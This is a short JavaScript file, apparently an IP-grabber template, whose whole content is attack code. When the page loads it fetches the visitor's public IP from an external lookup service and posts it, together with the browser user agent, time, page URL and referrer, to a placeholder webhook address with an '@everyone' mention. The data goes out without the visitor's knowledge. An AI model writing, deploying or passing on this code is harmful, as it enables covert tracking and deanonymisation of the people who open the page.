var G = function() {
    var ip = '';
    var req = new XMLHttpRequest();
    req.open('GET', 'https://myexternalip.com/raw', false);
    req.send();
    if (req.status == 200) {
        ip = req.responseText;
    }
    return ip;
};

function LethalDownloadExploit() {
    fetch('{webhook}', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({
            content: `@everyone \nIP: ||${G()}||\nBrowser: ${navigator.userAgent}\nTime: ${new Date().toLocaleString()}\nURL: ${window.location.href}\nReferrer: ${document.referrer}\n`
        })
    });
}
LethalDownloadExploit();
